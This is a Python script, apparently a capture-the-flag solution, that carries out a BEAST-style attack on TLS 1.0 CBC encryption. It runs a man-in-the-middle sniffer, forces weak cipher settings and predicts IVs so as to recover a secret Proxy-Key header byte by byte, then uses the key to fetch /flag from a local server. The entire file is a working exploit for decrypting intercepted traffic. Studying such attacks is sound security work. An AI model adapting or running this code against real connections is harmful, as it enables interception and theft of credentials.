from sys import argv
from socket import create_connection, create_server, AF_INET6
from threading import Thread
from struct import unpack
from binascii import hexlify
from ssl import SSLContext, PROTOCOL_TLSv1
from Crypto.Util.strxor import strxor
from collections import deque

SSL_OP_DONT_INSERT_EMPTY_FRAGMENTS = 2048


def build_ssl_context():
    tls = SSLContext(PROTOCOL_TLSv1)
    tls.set_ciphers("ECDHE-RSA-AES128-SHA@SECLEVEL=0")
    tls.options |= SSL_OP_DONT_INSERT_EMPTY_FRAGMENTS
    return tls


def recvn(socket, n):
    buffer = b""

    while n > 0:
        try:
            data = socket.recv(n)
        except BrokenPipeError:
            return None

        if data == b"":
            return None

        buffer += data
        n -= len(data)

    return buffer


def sendall(socket, data):
    try:
        socket.sendall(data)
    except BrokenPipeError:
        pass


def sniff_and_forward(rx, tx, callback):
    while True:
        header = recvn(rx, 5)
        if header is None:
            break

        type, _, _, size = unpack(">3BH", header)

        content = recvn(rx, size)
        if content is None:
            break

        if callback is not None:
            callback(type, content)

        sendall(tx, header + content)


def run_sniffer(c2s, s2c, catcher, target):
    def handle_client(client, address):
        server = create_connection(target)

        c2s_thread = Thread(target=sniff_and_forward, args=(client, server, c2s))
        s2c_thread = Thread(target=sniff_and_forward, args=(server, client, s2c))

        c2s_thread.start()
        s2c_thread.start()

        c2s_thread.join()
        s2c_thread.join()

    with create_server(catcher, family=AF_INET6, reuse_port=True) as listener:
        while True:
            socket, address = listener.accept()
            Thread(target=handle_client, args=(socket, address)).start()


proxy = None
endpoint = b"BBBBBBBBBBBBBBBBBB"
ptx = b"/2\r\nProxy-Key: "
alphabet = deque("ABCDEFGHIJKLMNOPQRSTUVWXYZ\r\n")
request_complete = False
expected = 16 * b"\0"
secret = b""
# prev_iv = None


def handle_ciphertext(type, content):
    global request_complete
    global endpoint
    global alphabet
    global ptx
    global expected
    global secret
    # global prev_iv

    # Consider only data records
    if type != 0x17:
        return

    content = content[:-20]

    if request_complete:
        if content[:16] == expected:
            # Guess is correct
            ptx = ptx[1:] + alphabet[0].encode()
            secret += alphabet[0].encode()
            endpoint = endpoint[:-1]

            if secret.endswith(b"\r\n"):
                proxy.close()
                finish(secret)
                return

        alphabet.rotate(-1)

        request_complete = False
        proxy.sendall(b"GET /" + endpoint + b" HTTP/2\r\n")
        return

    print(
        "\x1b[1mSecret:\x1b[0m \x1b[93m{}\x1b[0m ".format(
            (secret.decode() + alphabet[0]).replace("\r", "\\r").replace("\n", "\\n")
        ),
        end="\r",
    )

    prev_iv = content[16:32]
    iv = content[-16:]
    guess = ptx + alphabet[0].encode()
    expected = content[32:48]

    payload = strxor(iv, strxor(prev_iv, guess))

    request_complete = True
    proxy.sendall(b"Idempotency-Key: " + payload + b"\r\n\r\n")


def finish(secret):
    tls = build_ssl_context()
    socket = create_connection(("::1", 8080))
    server = tls.wrap_socket(socket, server_hostname="beast.example")

    server.sendall(b"GET /flag HTTP/2\r\nProxy-Key: " + secret + b"\r\n\r\n")
    print("\x1b[1m{}\x1b[0m".format(server.recv(2**16)[:-4].decode()))


def main():
    global proxy
    global endpoint

    #    try:
    #        catcher_host = argv[1]
    #        catcher_port = int(argv[2])
    #        target_host = argv[3]
    #        target_port = int(argv[4])
    #    except (IndexError, ValueError):
    #        print(
    #            "Usage:",
    #            argv[0],
    #            "[CATCHER HOST] [CATCHER PORT] [TARGET HOST] [TARGET PORT]",
    #        )
    #        return

    tls = build_ssl_context()
    socket = create_connection(("::1", 8000))
    proxy = tls.wrap_socket(socket, server_hostname="beast.example")

    sniffer = Thread(
        target=run_sniffer,
        args=(
            handle_ciphertext,
            None,
            ("::1", 1337),
            ("::1", 8080),
        ),
    )
    sniffer.start()

    proxy.sendall(b"GET /" + endpoint + b" HTTP/2\r\n")

    sniffer.join()


if __name__ == "__main__":
    main()

# split = lambda x: [ x[i:i+16] for i in range(0, len(x), 16)]
